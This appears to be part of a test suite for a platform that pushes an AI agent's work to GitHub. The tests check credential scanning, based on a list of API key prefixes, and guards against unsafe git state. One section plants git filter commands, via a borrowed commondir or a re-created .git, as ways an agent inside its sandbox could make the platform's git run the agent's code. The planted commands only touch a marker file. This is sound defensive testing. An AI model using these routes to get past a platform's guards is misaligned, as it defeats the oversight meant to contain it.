		connection: adaConnection,
		repository,
		sandbox,
		branch,
		sessionId: "provider-credentials",
		pushed: null,
	};
	const examples = [
		["Anthropic OAuth setup token", "sk-ant-oat01-"],
		["Anthropic API key", "sk-ant-api03-"],
		["Anthropic admin key", "sk-ant-admin01-"],
		["OpenCode API key", "oc_sk_"],
		["OpenRouter API key", "sk-or-v1-"],
		["OpenAI API key", "sk-proj-"],
		["Groq API key", "gsk_"],
		["Google API key", "AIza"],
		["Hugging Face access token", "hf_"],
		["Perplexity API key", "pplx-"],
		["xAI API key", "xai-"],
		["NVIDIA API key", "nvapi-"],
		["Fireworks API key", "fw_"],
		["Cerebras API key", "csk-"],
		["Vercel AI Gateway key", "vck_"],
		["Kimi API key", "sk-kimi-"],
		["Alibaba plan API key", "sk-sp-"],
		["MiniMax API key", "sk-cp-"],
		["provider API key", "sk-"],
	] as const;
	const values = examples.map(([, prefix]) => prefix + randomBytes(32).toString("hex"));
	expect(
		"each credential alone is identified, and prefix-only documentation is allowed",
		examples.every(
			([kind, prefix], i) => pushTokenKinds(values[i]!).includes(kind) && pushTokenKinds(prefix + "…").length === 0,
		),
	);
	const file = join(sandbox.cwd, values[0]!);
	writeFileSync(file, values.join("\n"));
	const staged = await sandbox.run(
		"git add -A && git commit -qm fixtures && git rm -q -- " + values[0] + " && git commit -qm removed",
	);
	expect("the fixture credential file exists only in an earlier commit", staged.exitCode === 0);
	const from = standin.minted.length;
	const refused = await problem(() => publish.pushWork(input, "Check credential history"));
	expect(
		"the refusal identifies each kind, with no credential from a filename or blob in the message",
		examples.every(([kind]) => refused?.message.includes(kind)) &&
			values.every(value => !refused?.message.includes(value)),
	);
	expect(
		"no push token was issued and the branch is absent",
		!standin.minted.slice(from).some(entry => entry.permissions?.contents === "write") &&
			standin.branchHead(harbor, branch) === null,
	);
});

await section("credential shape scope and scan limits", async () => {
	const remote = standin.addRepository({
		owner: "ada",
		name: "shape-scope",
		private: true,
		installation: adaInstallation,
	});
	repos.forgetGithubCaches();
	const key = "sk-proj-" + "f".repeat(40);
	const path = "checks/fixtures.txt";
	const sources = ["factory-check.ts", "github-check.ts", "reviewer-task-check.ts"];
	const existing = sources
		.map(file => {
			const lines = readFileSync(new URL(file, import.meta.url), "utf8").split("\n");
			const fixture = lines.find(line => pushTokenKinds(line).includes("GitHub token"));
			if (!fixture) throw Error("Missing existing credential fixture in " + file);
			return fixture;
		})
		.join("\n");
	standin.commit(remote, "main", { [path]: existing + "\n" + key + "\nafter\n" }, "Existing fixtures");
	const sandbox = localSandbox("shape-scope");
	const repository = stored(remote, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const input = {
		app,
		connection: adaConnection,
		repository,
		sandbox,
		branch: "windlass/scope",
		sessionId: "scope",
		pushed: null,
	};
	for (const [label, contents] of [
		["context", existing + "\n" + key + "\nchanged\n"],
		["deletion", "changed\n"],
	] as const) {
		writeFileSync(join(sandbox.cwd, path), contents);
		expect(label + " allows an ordinary push", (await problem(() => publish.pushWork(input, label))) === null);
	}
	writeFileSync(join(sandbox.cwd, path), "++" + key + "\n");
	const refused = await problem(() => publish.pushWork(input, "added"));
	expect(
		"the refusal names the safe path for an added line that resembles a header",
		!!refused?.message.includes(path) && !refused.message.includes(key),
	);
	writeFileSync(join(sandbox.cwd, path), "normal\n");
	const message = await problem(() => publish.pushWork(input, "example patch\n\ndiff --git a/a b/a\n-" + key));
	expect("a patch quoted in a commit message is still checked", !!message?.message.includes("OpenAI API key"));
	writeFileSync(join(sandbox.cwd, path), "sk-proj-" + "a".repeat(7_900_000));
	const large = await problem(() => publish.pushWork(input, "Large addition"));
	expect(
		"a near-limit credential gets a bounded diagnostic",
		!!large?.message.includes("OpenAI API key") && large.message.length < 300,
	);
});

await section("a mismatched outgoing object digest refuses the push", async () => {
	const sandbox = localSandbox("range");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	writeFileSync(join(sandbox.cwd, "change"), "change");
	const original = sandbox.run.bind(sandbox);
	sandbox.run = async (command, options) => {
		const result = await original(command, options);
		if (command.includes('base64 -w0 "$patch"'))
			result.stdout = result.stdout.replace(/^([0-9]+) [a-f0-9]{64}/, "$1 " + "0".repeat(64));
		return result;
	};
	const branch = "windlass/object-digest";
	const refused = await problem(() =>
		publish.pushWork(
			{ app, connection: adaConnection, sandbox, repository, branch, sessionId: "range", pushed: null },
			"Range",
		),
	);
	expect(
		"only the digest recorded for the scanned head authorizes transport",
		!!refused?.message.includes("no longer match") && standin.branchHead(harbor, branch) === null,
	);
});

await section("missing recovered base requires fetch_base", async () => {
	const remote = standin.addRepository({
		owner: "ada",
		name: "base-recovery",
		private: true,
		installation: adaInstallation,
	});
	repos.forgetGithubCaches();
	const sandbox = localSandbox("missing-base");
	const repository = stored(remote, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	repository.baseSha = null;
	standin.commit(remote, "main", { "remote.txt": "new base" }, "Advance remote");
	writeFileSync(join(sandbox.cwd, "local.txt"), "work");
	const input = {
		app,
		connection: adaConnection,
		repository,
		sandbox,
		branch: "windlass/missing-base",
		sessionId: "missing-base",
		pushed: null,
	};
	const from = standin.minted.length;
	const refused = await problem(() => publish.pushWork(input, "Local work"));
	expect(
		"a recovered SHA missing locally stops before a write token",
		!!refused?.message.includes("fetch_base") &&
			!standin.minted.slice(from).some(entry => entry.permissions?.contents === "write"),
	);
	await publish.fetchBase(app, adaConnection, repository, sandbox);
	expect("the same changes publish after a confirmed fetch", (await publish.pushWork(input, "Local work")).pushed);
});

await section("nested repositories are refused before turn-end diff, panel probe or commit", async () => {
	const { DIFF_COMMAND } = await import("../server/src/actors/agent-session.js");
	const sandbox = localSandbox("nested");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const inner = "packages/example/inner";
	await sandbox.run(`mkdir -p ${inner} && git init -q ${inner} && git -C ${inner} commit -q --allow-empty -m inner`);
	const input = {
		sessionId: "guard-nested",
		branch: "main",
		baseSha: repository.baseSha ?? null,
		pushed: null,
		author: { name: "Fixture", email: "fixture@example.invalid" },
	};
	for (const state of ["untracked", "indexed", "unpopulated"]) {
		if (state === "indexed") await sandbox.run(`git add -- ${inner}`);
		if (state === "unpopulated") await sandbox.run(`mv ${inner} ../saved-inner`);
		const why = state === "untracked" ? "nested" : "gitlink";
		// Each sentinel is reached only if the generated command passes its guard and returns successfully.
		for (const [name, command] of [
			["turn-end diff", DIFF_COMMAND],
			["panel probe", gitSteps.probeScript(repository.baseSha ?? null, null)],
			["commit", gitSteps.commitScript(input)],
		]) {
			const marker = join(sandbox.home, `completed-${state}-${name}`);
			const result = await sandbox.run(`${command}\ntouch "$HOME/completed-${state}-${name}"`, { stdin: "Fixture\n" });
			expect(
				`${state}: ${name} refused before completing`,
				result.exitCode === 3 && gitSteps.markers(result.stdout).get("unsafe") === why && !existsSync(marker),
			);
		}
	}
});

await section("husky configuration works for the session and the platform push", async () => {
	const { STATUS_COMMAND, DIFF_COMMAND } = await import("../server/src/actors/agent-session.js");
	const sandbox = localSandbox("husky");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const setup = await sandbox.run(
		"mkdir -p .husky/_ && git config core.hooksPath .husky/_ && git config core.fsmonitor .husky/_/monitor",
	);
	const marker = join(sandbox.home, "hook-ran");
	for (const hook of ["pre-commit", "post-commit", "post-checkout", "pre-push", "monitor"]) {
		const path = join(sandbox.cwd, ".husky/_", hook);
		writeFileSync(path, '#!/bin/sh\ntouch "$HOME/hook-ran"\nexit 1\n');
		chmodSync(path, 0o755);
	}
	writeFileSync(join(sandbox.cwd, "work.txt"), "changed\n");
	const status = await sandbox.run(STATUS_COMMAND);
	const diff = await sandbox.run(DIFF_COMMAND);
	const dirty = await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, null);
	const branch = "windlass/husky-000001";
	const input = { app, connection: adaConnection, repository, sandbox, sessionId: "guard-husky", branch, pushed: null };
	const err = await problem(() => publish.pushWork(input, "Husky work"));
	expect(
		"husky status, diff, panel probe and push succeed without invoking any hook",
		setup.exitCode === 0 &&
			status.stdout.includes("work.txt") &&
			diff.stdout.includes("+changed") &&
			dirty === true &&
			err === null &&
			standin.fileOn(harbor, branch, "work.txt") === "changed\n" &&
			!existsSync(marker),
	);
	await sandbox.run("git config filter.lfs.required true");
	const probe = await gitSteps.probeWork(sandbox, repository.baseSha ?? null, null);
	expect("a local LFS filter is still refused", !probe.ok && probe.marks.get("unsafe") === "filter.lfs.required");
});

await section("private git captures file content and modes", async () => {
	const { STATUS_COMMAND, DIFF_COMMAND } = await import("../server/src/actors/agent-session.js");
	const repository = stored(harbor, adaInstallation);
	const sandbox = localSandbox("private-content");
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const branch = "windlass/private-content";
	const prepared = await sandbox.run(
		[
			"set -eu",
			"mv README.md MANUAL.md",
			"rm src/add.ts",
			"printf 'payload\\n' > upload.data",
			"printf '*.data filter=undefined-fixture\\n' > .gitattributes",
			"printf '#!/bin/sh\\n' > tool && chmod +x tool",
			"printf 'outside the worktree' > ../outside",
			"ln -s ../outside link && ln -s ../home directory-link",
		].join("\n"),
	);
	const status = await sandbox.run(STATUS_COMMAND);
	const diff = await sandbox.run(DIFF_COMMAND);
	const dirty = await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, null);
	expect(
		"private status, diff and probe see edits, removals and links",
		prepared.exitCode === 0 &&
			status.stdout.includes("upload.data") &&
			status.stdout.includes("src/add.ts") &&
			diff.stdout.includes("+../outside") &&
			!diff.stdout.includes("outside the worktree") &&
			dirty === true,
	);
	const result = await publish.pushWork(
		{ app, connection: adaConnection, repository, sandbox, branch, sessionId: "private-content", pushed: null },
		"Snapshot content",
	);
	const tree = execFileSync("git", ["--git-dir", harbor.path, "ls-tree", "-r", branch], { encoding: "utf8" });
	const mode = (path: string) =>
		tree
			.split("\n")
			.find(entry => entry.endsWith(`\t${path}`))
			?.split(" ")[0];
	expect(
		"the pushed tree contains the rename and deletion and preserves exact file bytes with an undefined filter",
		result.head === standin.branchHead(harbor, branch) &&
			standin.fileOn(harbor, branch, "README.md") === null &&
			standin.fileOn(harbor, branch, "MANUAL.md") === standin.fileOn(harbor, "main", "README.md") &&
			standin.fileOn(harbor, branch, "src/add.ts") === null &&
			standin.fileOn(harbor, branch, "upload.data") === "payload\n" &&
			mode("upload.data") === "100644",
	);
	expect(
		"executable files and links to an external file and directory have Git's executable and symlink modes",
		mode("tool") === "100755" &&
			mode("link") === "120000" &&
			mode("directory-link") === "120000" &&
			standin.fileOn(harbor, branch, "link") === "../outside" &&
			standin.fileOn(harbor, branch, "directory-link") === "../home",
	);
	const local = await sandbox.run("git rev-parse HEAD; git status --porcelain");
	expect(
		"the workspace HEAD and index agree with the pushed tree",
		local.exitCode === 0 && local.stdout === result.head + "\n",
	);
});

/** Run a second command concurrently, pausing the platform at the guard boundary. */
function swapAfterGuard(sandbox: Local): Promise<ExecResult> {
	const localRun = sandbox.run.bind(sandbox);
	// Rendezvous at the check/use boundary so the competing command wins the swap on every run.
	sandbox.run = (script, options) =>
		localRun(
			script.replace(
				"\nwlp_guard\n",
				"\nwlp_guard\ntouch ../guard-done\ntimeout 10 bash -c 'until test -e ../swap-done; do sleep .01; done'\n",
			),
			options,
		);
	return localRun(
		"set -eu; timeout 10 bash -c 'until test -e ../guard-done; do sleep .01; done'; mv .git ../original; mv ../replacement .git; touch ../swap-done",
	);
}

await section("private git survives a workspace .git replacement during push", async () => {
	const repository = stored(harbor, adaInstallation);
	const sandbox = localSandbox("concurrent-push");
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const branch = "windlass/concurrent-push";
	writeFileSync(join(sandbox.cwd, ".gitattributes"), "*.data filter=fixture\n");
	writeFileSync(join(sandbox.cwd, "work.data"), "content from the worktree\n");
	// An inert control: this repository requires a driver that does not exist. Any add
	// using its config must fail. A ref file is also a marker for an accidental branch update.
	const prepare = await sandbox.run(
		"set -eu; cp -R .git ../replacement; git --git-dir=../replacement config filter.fixture.required true; cp -R ../replacement ../control",
	);
	const control = await sandbox.run(
		`git --git-dir=../control branch ${branch} HEAD && git --git-dir=../control --work-tree=. add -- work.data`,
	);
	expect(
		"ordinary Git creates the control branch marker and the required filter rejects the file",
		prepare.exitCode === 0 &&
			existsSync(join(sandbox.cwd, "../control/refs/heads", branch)) &&
			control.exitCode !== 0 &&
			control.stderr.includes("filter"),
	);
	const swap = swapAfterGuard(sandbox);
	const [result, swapped] = await Promise.all([
		publish.pushWork(
			{
				app,
				connection: adaConnection,
				repository,
				sandbox,
				branch,
				sessionId: "concurrent-push",
				pushed: null,
				redact: value => value,
			},
			"Concurrent push",
		),
		swap,
	]);
	const marker = join(sandbox.cwd, ".git/refs/heads", branch);
	expect(
		"a concurrent swap after the guard leaves no branch marker in the replacement and the scanned content reaches GitHub",
		swapped.exitCode === 0 &&
			result.workspaceChanged === true &&
			result.head === standin.branchHead(harbor, branch) &&
			standin.fileOn(harbor, branch, "work.data") === "content from the worktree\n" &&
			!existsSync(marker),
	);
});

await section("private git refuses to install fetched refs into a replacement", async () => {
	const remote = standin.addRepository({
		owner: "ada",
		name: "fetch-race",
		private: true,
		installation: adaInstallation,
	});
	repos.forgetGithubCaches();
	const repository = stored(remote, adaInstallation);
	const sandbox = localSandbox("concurrent-fetch");
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const initial = standin.branchHead(remote, "main");
	const next = standin.commit(remote, "main", { "new.txt": "fetched\n" }, "Advance the base");
	const prepared = await sandbox.run("cp -R .git ../replacement");
	const localRun = sandbox.run.bind(sandbox);
	const [refused, swapped] = await Promise.all([
		problem(() => publish.fetchBase(app, adaConnection, repository, sandbox)),
		swapAfterGuard(sandbox),
	]);
	const tracking = await localRun("git rev-parse origin/main");
	expect(
		"a fetch racing a .git replacement leaves its origin/main at the original tip",
		prepared.exitCode === 0 && swapped.exitCode === 0 && refused !== null && tracking.stdout.trim() === initial,
	);
	sandbox.run = localRun;
	await publish.fetchBase(app, adaConnection, repository, sandbox);
	const retried = await localRun("git rev-parse origin/main; git show origin/main:new.txt");
	expect(
		"a retry installs the new ref and objects in the current workspace",
		retried.exitCode === 0 && retried.stdout === next + "\nfetched\n",
	);
});

await section("screenshots in an earlier local commit stay off the remote", async () => {
	const sandbox = localSandbox("committed-screenshots");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const branch = "windlass/committed-screenshots";
	const prepared = await sandbox.run(
		"set -eu; mkdir .wlp-shots; echo shot > .wlp-shots/one.png; git add -f .wlp-shots; git commit -qm screenshot; git rm -qr .wlp-shots; git commit -qm removed",
	);
	if (prepared.exitCode !== 0) throw new Error("could not prepare screenshot history");
	const refused = await problem(() =>
		publish.pushWork(
			{ app, connection: adaConnection, repository, sandbox, branch, sessionId: "committed-screenshots", pushed: null },
			"Fixture",
		),
	);
	expect(
		"a later deletion cannot publish a screenshot in history",
		refused?.message.includes("contains .wlp-shots") === true && standin.branchHead(harbor, branch) === null,
	);
});

await section("only a GitHub-confirmed base bounds the workspace", async () => {
	const sandbox = localSandbox("base-state");
	const repository = stored(harbor, adaInstallation);
	const expected = standin.branchHead(harbor, repository.branch);
	const legacy = join(
		"/tmp",
		"wlp-base-" +
			createHash("sha256")
				.update(sandbox.cwd + "\n" + repository.branch)
				.digest("hex"),
	);
	writeFileSync(legacy, "obsolete fixture\n", { flag: "wx" });
	try {
		await publish.cloneRepository(app, adaConnection, repository, sandbox);
		await publish.fetchBase(app, adaConnection, repository, sandbox);
		expect(
			"clone and fetch leave the obsolete record alone and keep the observed base in platform state",
			readFileSync(legacy, "utf8") === "obsolete fixture\n" && repository.baseSha === expected,
		);
		const storedBase = JSON.parse(JSON.stringify(repository)).baseSha;
		expect(
			"the actor-held base survives serialization and identifies a clean workspace",
			(await publish.hasUnpushedWork(sandbox, storedBase, null)) === false,
		);
		await sandbox.run(
			"echo change > ordinary.txt && git add ordinary.txt && git commit -qm work && git update-ref refs/remotes/origin/main HEAD",
		);
		const work = await gitSteps.readWork(sandbox, storedBase);
		expect(
			"the probe and verification diff still report the work",
			(await publish.hasUnpushedWork(sandbox, storedBase, null)) === true &&
				work?.files.some(file => file.path === "ordinary.txt") === true,
		);
	} finally {
		rmSync(legacy, { force: true });
	}
});

await section("outgoing history is checked before the push transport", async () => {
	const repository = stored(harbor, adaInstallation);
	const value = "history-check-fixture";
	for (const kind of ["merge", "binary", "message", "large", "buffered", "base"]) {
		const sandbox = localSandbox(`history-${kind}`);
		await publish.cloneRepository(app, adaConnection, repository, sandbox);
		const branch = `windlass/history-${kind}`;
		const prepare = async (cmd: string) => {
			if ((await sandbox.run(cmd)).exitCode !== 0) throw new Error(`could not prepare ${kind} history`);
		};
		await prepare(`git switch -qc ${branch}`);
		if (kind === "merge") {
			await prepare(
				"git switch -qc side && git commit --allow-empty -qm side && git switch -q - && git merge --no-ff --no-commit side",
			);
			writeFileSync(join(sandbox.cwd, ".env"), value);
		} else if (kind === "binary") {
			writeFileSync(join(sandbox.cwd, "fixture.bin"), Buffer.from(`a\0${value}`));
		} else if (kind === "message") {
			await prepare(`git commit --allow-empty -qm ${value}`);
		} else if (kind === "base") {
			// A stale workspace tracking ref must not determine which commits were seen by the platform.
			writeFileSync(join(sandbox.cwd, "fixture.txt"), value);
			await prepare("git add fixture.txt && git commit -qm fixture && git update-ref refs/remotes/origin/main HEAD");
		} else {
			writeFileSync(
				join(sandbox.cwd, "fixture.txt"),
				"a".repeat(kind === "large" ? 8_000_000 : 5_000_000) + (kind === "buffered" ? value : ""),
			);
		}
		// Model the providers' buffered stdout cap. No push transport is allowed in these refusal cases.
		let transport = false;
		const localRun = sandbox.run.bind(sandbox);
		sandbox.run = async (command, options) => {
			if (command.includes("push --porcelain")) {
				transport = true;
				return { exitCode: 1, stdout: "", stderr: "", timedOut: false, aborted: false };
			}
			const result = await localRun(command, options);
			options?.onStdout?.(result.stdout);
			return { ...result, stdout: result.stdout.slice(0, 4 * 1024 * 1024) };
		};
		const input = {
			app,
			connection: adaConnection,
			repository,
			sandbox,
			branch,
			sessionId: `guard-history-${kind}`,
			pushed: null,
			redact: (text: string) => text.replaceAll(value, "[secret:FIXTURE]"),
		};
		const refused = await problem(() => publish.pushWork(input, "Fixture"));
		expect(
			`${kind}: refusal before the transport`,
			refused?.message.includes(kind === "large" ? "too large to check for saved secrets" : "the secret FIXTURE") ===
				true &&
				!transport &&
				standin.branchHead(harbor, branch) === null,
		);
	}
});

await section("an up-to-date branch never yields a platform push receipt", async () => {
	const { recordPushHead } = await import("../server/src/actors/agent-session.js");
	const meta = { platformPushed: null as string | null, pushedHead: null as string | null };
	const sandbox = localSandbox("lease-noop");
	const repository = stored(harbor, adaInstallation);
	await publish.cloneRepository(app, adaConnection, repository, sandbox);
	const branch = "windlass/lease-noop";
	const base = { app, connection: adaConnection, repository, sandbox, branch, sessionId: "guard-lease", pushed: null };
	writeFileSync(join(sandbox.cwd, "work.txt"), "work\n");
	const first = await publish.pushWork(base, "Platform work");
	expect(
		"the initial transfer yields its receipt",
		first.head !== null && recordPushHead(meta, sandbox, first.head) && meta.platformPushed === first.head,
	);
	const other = standin.commit(harbor, branch, { "other.txt": "other\n" }, "Someone else's work");
	await publish.fetchBase(app, adaConnection, repository, sandbox, branch);
	const ff = await sandbox.run(`git merge --ff-only origin/${branch}`);
	const noop = await publish.pushWork({ ...base, pushed: first.head, lease: first.head }, "Nothing new");
	expect(
		"observing the other person's commit at the remote yields no lease on it",
		ff.exitCode === 0 &&
			noop.head === other &&
			!recordPushHead(meta, sandbox, other) &&
			meta.pushedHead === other &&
			meta.platformPushed === first.head &&
			standin.branchHead(harbor, branch) === other,
	);
	standin.appPermissions = { metadata: "read", contents: "write" };
	try {
		await publish.publishWork({
			...base,
			pushed: other,
			pull: null,
			message: { title: "Open it", body: "" },
			evidence: NOTHING_VERIFIED,
		});
		expect("PR step refused after a no-op", false);
	} catch (error) {
		expect(
			"a failed PR after a no-op still yields no lease on the observed head",
			error instanceof publish.PullProblem &&
				error.head === other &&
				!recordPushHead(meta, sandbox, other) &&
				meta.pushedHead === other &&
				meta.platformPushed === first.head,
		);
	} finally {
		standin.appPermissions = { metadata: "read", contents: "write", pull_requests: "write" };
	}
});

await section(
	"a workspace whose git would start a program of the agent's is refused before any git of the platform's runs",
	async () => {
		const { WORKSPACE_GIT_START, readWork } = await import("../server/src/github/git.js");
		const repository = stored(harbor, adaInstallation);
		const variants: Array<{ name: string; plant: (cwd: string, marker: string) => string }> = [
			{
				// Inside bubblewrap a command may not write .git/config, but it can make .git borrow another configuration.
				name: "a commondir whose configuration defines a filter",
				plant: (cwd, marker) => {
					const other = join(cwd, "..", "borrowed");
					execFileSync("cp", ["-r", join(cwd, ".git"), other]);
					writeFileSync(
						join(other, "config"),
						`${readFileSync(join(other, "config"), "utf8")}[filter "x"]\n\tclean = sh -c 'touch ${marker}; cat'\n\tsmudge = sh -c 'touch ${marker}; cat'\n`,
					);
					writeFileSync(join(cwd, ".git/commondir"), `${other}\n`);
					return "* filter=x\n";
				},
			},
			{
				// Or put the repository aside and make one of its own.
				name: "a .git moved aside and made again, with a filter",
				plant: (cwd, marker) => {
					execFileSync("mv", [join(cwd, ".git"), join(cwd, ".gitold")]);
					execFileSync("git", ["init", "--quiet", "."], { cwd });
					execFileSync("git", ["config", `filter.x.clean`, `sh -c 'touch ${marker}; cat'`], { cwd });
					return "* filter=x\n";
				},
			},
		];
		for (const variant of variants) {
			const sandbox = localSandbox("unsafe");
			await publish.cloneRepository(app, adaConnection, repository, sandbox);
			const marker = join(scratch, `marker-${randomBytes(4).toString("hex")}`);
			writeFileSync(join(sandbox.cwd, ".gitattributes"), variant.plant(sandbox.cwd, marker));
			writeFileSync(join(sandbox.cwd, "CHANGED.md"), "changed\n");
			const branch = `windlass/unsafe-${randomBytes(3).toString("hex")}`;
			const before = standin.branchHead(harbor, branch);
			const push = await problem(() =>
				publish.pushWork(
					{
						app,
						connection: adaConnection,
						repository,
						sandbox,
						sessionId: "s_unsafe00000000",
						branch,
						pushed: null,
						lease: null,
					},
					"Try",
				),
			);
			const probe = await publish.hasUnpushedWork(sandbox, repository.baseSha ?? null, null);
			const read = await readWork(sandbox, repository.baseSha ?? null);
			const status = await sandbox.run(`${WORKSPACE_GIT_START}\ngit --no-optional-locks status --porcelain=v1`);
			expect(
				`${variant.name}: the push, the probe, the read and the session's status are refused, nothing is pushed, and no program of the workspace's ran`,
				push?.message.startsWith("The workspace's git settings were changed in a way the platform does not run") ===
					true &&
					probe === null &&
					read === null &&
					status.exitCode === 3 &&
					status.stdout.startsWith("wlp:unsafe") &&
					standin.branchHead(harbor, branch) === before &&
					!existsSync(marker),
				`${push?.message.slice(0, 90)} | probe ${probe} | status ${status.exitCode} ${status.stdout.trim()} | marker ${existsSync(marker)}`,
			);
		}
	},
);

await section(
	"an item's step after its agent pushed everything: the open pull request is described again, not refused",
	async () => {
		const sandbox = localSandbox("shown");
		const repository = stored(harbor, adaInstallation);
		await publish.cloneRepository(app, adaConnection, repository, sandbox);
		const branch = "windlass/item-shown-00eeff";
		const base = {
			app,
			connection: adaConnection,
			repository,
			sandbox,
			sessionId: "s_itemshown00eeff",
			branch,
			evidence: NOTHING_VERIFIED,
		};
		writeFileSync(join(sandbox.cwd, "ITEM.md"), "- one\n");
		const network: import("../server/src/contract.js").BlockedNetwork = {
			hosts: [
				{
					host: "www.gh-123.deadbeef.example",
					port: 443,
					count: 3,
					firstAt: 1,
					lastAt: 3,
					reason: "machine_policy",
					allow: "machine",
					machineNames: ["Build box"],
				},
			],
			overflow: 2,
		};
		const opened = await publish.publishWork({
			...base,
			blockedNetwork: network,
			pull: null,
			pushed: null,
			message: { title: "The item", body: "Round one." },
		});
		const description = standin.pulls.find(p => p.repository === harbor.id && p.number === opened.pull.number)!.body;
		expect(
			"an item PR includes the blocked destination and count once, without offering a repository fix for machine policy",
			description.split(
				"Blocked network requests during this work: `www.gh-123.deadbeef.example:443` (3), 2 other requests.",
			).length === 2 && !description.includes("repository network settings"),
		);
		// A repository can go public after the session and its cached installation listing were made.
		harbor.private = false;
		try {
			await publish.publishWork({
				...base,
				blockedNetwork: network,
				pull: opened.pull,
				pushed: opened.head,
				shownIsEnough: true,
				retitle: true,
				message: { title: "The item", body: "Round one." },
			});
			const publicBody = standin.pulls.find(p => p.repository === harbor.id && p.number === opened.pull.number)!.body;
			expect(
				"a public PR renders only the total, including overflow",
				publicBody.split("\n").includes("Blocked network requests during this work: 5.") &&
					!publicBody.includes(network.hosts[0].host!),
			);
		} finally {
			harbor.private = true;
		}
		expect(
			"the network line belongs to the PR description alone",
			!standin.lastCommit(harbor, branch).message.includes("Blocked network"),
		);
		writeFileSync(join(sandbox.cwd, "ITEM.md"), "- one\n- two\n");
		const pushed = await publish.pushWork({ ...base, pushed: opened.head, lease: opened.head }, "The fix of round two");
		const refused = await problem(() =>
			publish.publishWork({ ...base, pull: opened.pull, pushed: pushed.head, message: { title: "unused", body: "" } }),
		);
		const shown = await publish.publishWork({
			...base,
			pull: opened.pull,
			pushed: pushed.head,
			shownIsEnough: true,
			message: { title: "unused", body: "" },
		});
		expect(
			"from the panel, nothing to push is still refused",
			refused?.message.startsWith("There is nothing to push") === true,
			refused?.message,
		);
		expect(
			"for the item, it answers with the pull request: nothing pushed, nothing opened, the title kept",
			!shown.pushed &&
				!shown.opened &&
				shown.pull.number === opened.pull.number &&
				shown.pull.title === "The item" &&
				standin.branchHead(harbor, branch) === pushed.head,
			JSON.stringify(shown),
		);

		// A later turn's report is about its own part of the work (a CI fix, a review fix): the pull request keeps its title, and the person's own edit of it.
		writeFileSync(join(sandbox.cwd, "ITEM.md"), "- one\n- two\n- three\n");
		const later = await publish.publishWork({
			...base,
			pull: shown.pull,
			pushed: pushed.head,
			lease: pushed.head,
			shownIsEnough: true,
			retitle: true,
			keepTitle: true,
			message: { title: "Restore the requested sum export", body: "Round three." },
		});
		const pull = standin.pulls.find(p => p.repository === harbor.id && p.number === opened.pull.number)!;
		expect(
			"an item's later push keeps the pull request's title and gives it the new description",
			later.pushed && later.pull.title === "The item" && pull.title === "The item" && own(pull.body) === "Round three.",
			`${pull.title} | ${own(pull.body)}`,
		);
		pull.title = "Add an add() helper";
		writeFileSync(join(sandbox.cwd, "ITEM.md"), "- one\n- two\n- three\n- four\n");
		const edited = await publish.publishWork({
			...base,
			pull: later.pull,
			pushed: later.head,
			lease: later.head,
			shownIsEnough: true,
			retitle: true,
			keepTitle: true,
			message: { title: "Complete capitalize API exports and docs", body: "Round four." },
		});
		expect(
			"a title the person gave the pull request at GitHub stays",
			edited.pull.title === "Add an add() helper" && pull.title === "Add an add() helper",
			pull.title,
		);
		const { head: kept } = edited;

		// The agent rebased onto a moved base and did not push: the item's step pushes over the platform's own last push, as the agent's push would.
		standin.commit(harbor, "main", { "ITEM_BASE.md": "the base moved\n" }, "The base moves for the item");
		await publish.fetchBase(app, adaConnection, repository, sandbox);
		const rebased = await sandbox.run("git rebase --quiet origin/main && git rev-parse HEAD");
		const fromPanel = await problem(() =>
			publish.publishWork({ ...base, pull: opened.pull, pushed: kept, message: { title: "unused", body: "" } }),
		);
		const fromItem = await publish.publishWork({
			...base,
			pull: opened.pull,
			pushed: kept,
			lease: kept,
			shownIsEnough: true,
			message: { title: "unused", body: "" },
		});
		expect(
			"after the agent rebased without pushing, the panel's push is refused, and the item's step, under the lease, replaces the platform's last push and keeps the pull request",
			rebased.exitCode === 0 &&
				fromPanel?.message.includes("has commits this workspace does not have") === true &&
				fromItem.pushed &&
				fromItem.pull.number === opened.pull.number &&
				standin.branchHead(harbor, branch) === rebased.stdout.trim(),
			`${fromPanel?.message.slice(0, 80)} | ${JSON.stringify({ pushed: fromItem.pushed, head: fromItem.head })}`,
		);
	},
);

// ---------------------------------------------------------------------------------------------
// Failures
// ---------------------------------------------------------------------------------------------

await section("failures: each is said in a sentence the user can act on", async () => {
	const message = { title: "Try to push", body: "" };
	const prepared = async (
		name: string,
		connection: StoredConnection,
		repository: StandinRepository,
		installation: StandinInstallation,
	) => {
		const sandbox = localSandbox(name);
		await publish.cloneRepository(app, connection, stored(repository, installation), sandbox);
		writeFileSync(join(sandbox.cwd, "work.txt"), `${name}\n`);
		return {
			evidence: NOTHING_VERIFIED,
			app,
			connection,
			repository: stored(repository, installation),
			sandbox,
			sessionId: `s_${name}`,
			branch: `windlass/${name}-000000`,
			pull: null,
			pushed: null,
			message,
		};
	};

	// No write access: bo may read acme/quay.
	const reader = await prepared("reader", boConnection, quay, acme);
	const from = standin.minted.length;
	const noWrite = await problem(() => publish.publishWork(reader));
	expect(
		"no write access",
		noWrite?.code === "github_denied" &&
			noWrite.message ===
				"bo can read acme/quay on GitHub but not write to it, so the platform cannot push there for you. Ask an owner of acme for write access, then push again.",
		noWrite?.message,
	);
	const untouched = await reader.sandbox.run("git log --oneline | wc -l; git status --porcelain");
	expect(
		"nothing was committed in his name, and no token for writing was asked for",
		untouched.stdout.trim().startsWith("1\n") &&
			untouched.stdout.includes("work.txt") &&
			!mintedSince(from).some(entry => entry.includes("write")),
		mintedSince(from).join("; "),
	);

	// The app itself may not write: its installation was given read access to contents only.
	const writer = await prepared("appread", adaConnection, quay, acme);
	standin.appPermissions = { metadata: "read", contents: "read", pull_requests: "write" };
	const appRead = await problem(() => publish.publishWork(writer));
	standin.appPermissions = { metadata: "read", contents: "write", pull_requests: "write" };
	expect(
		"the app has no permission to write",
		appRead?.code === "github_gone" && appRead.message.includes("was not given the permission this needs"),
